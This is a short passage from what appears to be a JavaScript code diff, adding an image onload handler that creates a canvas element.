+          img.onload = function() {
+            const canvas = document.createElement('canvas');
